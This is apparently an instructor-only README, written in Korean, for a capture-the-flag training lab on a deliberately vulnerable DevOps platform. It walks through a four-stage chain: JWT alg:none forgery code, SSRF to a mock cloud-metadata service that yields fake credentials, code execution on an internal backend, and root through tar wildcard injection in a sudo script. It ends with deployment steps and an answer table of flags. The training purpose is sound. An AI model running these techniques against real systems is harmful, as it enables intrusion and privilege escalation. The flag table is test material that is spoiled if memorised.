# Lab3 — ES DevOps Platform (Hard / 4 Stages, 3-Container)

> Instructor 전용 문서. 공격 체인·자격증명·flag가 모두 포함되어 있으므로 학생에게 그대로 배포하지 않는다.

## 시나리오

ES사 내부 DevOps 콘솔이 발견됐다. 일반 고객 계정으로 가입은 되지만, 내부 직원 전용 기능에 접근할 수 있는지, 그리고 그 안쪽에서 서버까지 장악할 수 있는지 점검하라.

- 대상: `<VM_외부_IP>:443`
- 난이도: Hard
- 스테이지: 4개, 컨테이너 3개(포탈/백엔드/내부 클라우드 메타데이터 mock)

## 아키텍처

```
:443 (외부 노출) ── [es-devops-portal] (JWT 인증, SSRF job 릴레이)
                        │  internal-net-3 (외부 미노출)
                        ├──▶ [es-imds-mock-v2] (IMDSv2 토큰 방식 mock)
                        └──▶ [es-automation-backend] (RCE 대상 + sudo wildcard privesc)
```

- `es-devops-portal`(`console/`): 유일한 외부 노출 서비스. JWT 인증(alg:none 결함) + 비동기 SSRF job 릴레이(`/internal/jobs`).
- `es-automation-backend`(`backend/`): 완전 내부 전용. `.rpt` 코드 실행 로직이 이제 여기 있으며, 별도 인증 없음(포탈만 호출한다는 암묵적 신뢰). `sudo` wildcard injection 취약점 보유.
- `es-imds-mock-v2`(`imds-mock-v2/`): 완전 내부 전용. 실제 AWS IMDSv2처럼 토큰(PUT) 없이는 자격증명을 안 준다.
- lab1/lab2와 네트워크·컨테이너 이름·자격증명 전부 분리.

## 공격 체인

### Stage 1 — JWT `alg:none` 위조 (Portal)

```bash
python3 - <<'PY'
import base64, json
def b64url(d): return base64.urlsafe_b64encode(d).decode().rstrip('=')
h = {"alg":"none","typ":"JWT"}
p = {"sub":"attacker","role":"staff"}
print(b64url(json.dumps(h).encode())+"."+b64url(json.dumps(p).encode())+".")
PY
```

```bash
curl -H "Authorization: Bearer <forged token>" http://$TARGET:443/internal/dashboard
```

→ `role: staff`로 인식되어 Stage1 flag + "리포트 job은 `/internal/jobs`로 등록/폴링" 안내 확보.

### Stage 2 — SSRF job으로 IMDSv2 피벗 (Portal → imds-mock-v2)

1. Job1: `PUT http://imds-mock-v2/latest/api/token` (헤더 `X-aws-ec2-metadata-token-ttl-seconds`) → 토큰 발급.
   - job 생성 직후 폴링하면 `queued`, 2초 이상 지난 뒤 폴링해야 실제 fetch가 일어나 `done`으로 바뀜(RedLab의 job 상태머신 패턴 재현).
2. Job2: `GET http://imds-mock-v2/latest/meta-data/iam/security-credentials/es-automation-role` (헤더 `X-aws-ec2-metadata-token: <token>`) → 가짜 IAM 자격증명 + Stage2 flag + `internal-services.automation-backend` 힌트(`http://automation-backend:8000/run`) 확보.

### Stage 3 — 두 번째 SSRF 피벗으로 백엔드 RCE

Job3: `POST http://automation-backend:8000/run` (`Content-Type: application/json`, body `{"code": "<python 코드>"}`) → 백엔드가 `python3`에 그대로 stdin으로 흘려보내 실행. 인터넷에 노출되지 않은 백엔드에 SSRF를 두 번 거쳐야만 도달 가능.

응답의 stdout으로 `id`, Stage3 flag(`/home/svc-report/stage3_note.txt`) 확인.

### Stage 4 — `sudo` wildcard injection으로 root (백엔드 내부)

백엔드의 `sudo -l`에 `/opt/es/maintenance/backup.sh`가 NOPASSWD로 등록되어 있고, 이 스크립트는 `/var/es/reports`에서 `tar czf ... *`를 실행한다. `--checkpoint=1`, `--checkpoint-action=exec=sh shell.sh` 파일명을 심어 tar가 `shell.sh`를 root 권한으로 실행하게 만들고, `shell.sh`가 `/root/flag.txt`를 읽어 쓰기 가능한 위치로 복사하게 해 최종 flag 획득.

Stage3 코드가 이 전체(파일 심기 + `sudo backup.sh` 트리거 + flag 복사)를 한 번에 수행하도록 작성 가능(one-shot RCE-to-root).

## 배포 방법

```bash
cd ES_Lab/lab3
docker compose up -d --build
```

빌드 시 VM의 DNS가 불안정하면(`docker build` 중 `deb.debian.org`/`pypi.org` 등 resolve 실패) `docker build --add-host=...`로 IP를 직접 지정해 우회해야 할 수 있다(자세한 내용은 WRITEUP.md 참고).

## 초기화 방법

```bash
cd ES_Lab/lab3
docker compose down
docker compose up -d --force-recreate
```

세 컨테이너 모두 상태를 파일시스템에 영구 저장하지 않으므로 재생성 시 완전히 초기화된다.

## 정답 확인 (Instructor 전용)

| 항목 | 값 |
|---|---|
| Stage1 flag | `esfg{VG05MElIbGxkQ0F0SUhSb1pTQmpiMjV6YjJ4bElHaGhjeUJ0YjNKbElIUm9ZVzRnWVNCc2IyZHBiaUJ3WVdkbExnPT0=}` → `Not yet - the console has more than a login page.` |
| Stage2 flag | `esfg{VG05MElIUm9aU0JrWlhOMGFXNWhkR2x2YmlCNVpYUWdMU0IwYUdVZ1ltRmphMlZ1WkNCcGN5QmpZV3hzYVc1bkxnPT0=}` → `Not the destination yet - the backend is calling.` |
| Stage3 flag | `esfg{UjJWMGRHbHVaeUIzWVhKdFpYSXVJRU5vWldOcklIZG9ZWFFnZEdocGN5QnphR1ZzYkNCallXNGdjM1ZrYnk0PQ==}` → `Getting warmer. Check what this shell can sudo.` |
| Stage4 최종 flag | `esfg{VjJWc2JDQmtiMjVsSVNCRlV5QkVaWFpQY0hNZ1VHeGhkR1p2Y20wZ1RHRmlNeUJqYkdWaGNpND0=}` → `Well done! ES DevOps Platform Lab3 clear.` |

모든 flag는 base64를 **두 번** 디코딩해야 실제 문구가 나온다(단일 인코딩인 lab1/lab2보다 심화).

## 필요 기술스택

- **Stage1**: JWT 구조·서명 검증 로직 이해, `alg:none` 위조, HTTP 헤더 조작
- **Stage2**: 비동기 job/상태머신 기반 SSRF, IMDSv2 토큰 흐름(PUT→토큰→GET) 이해, 서버측 요청 릴레이 악용
- **Stage3**: SSRF 체이닝(2차 피벗)으로 완전 비공개 내부 서비스 도달, 코드 실행 페이로드 작성
- **Stage4**: `sudo -l` 열거, tar wildcard injection(GTFOBins류), 리눅스 파일 권한/sudoers 이해

## 참고

- `es-imds-mock-v2`, `es-automation-backend`는 `internal-net-3`에만 연결되어 외부/다른 랩에서 직접 접근 불가능합니다.
- 이 랩이 실행 중이 아닐 때는 `docker compose down`으로 내려서 포트 443을 비워두세요.
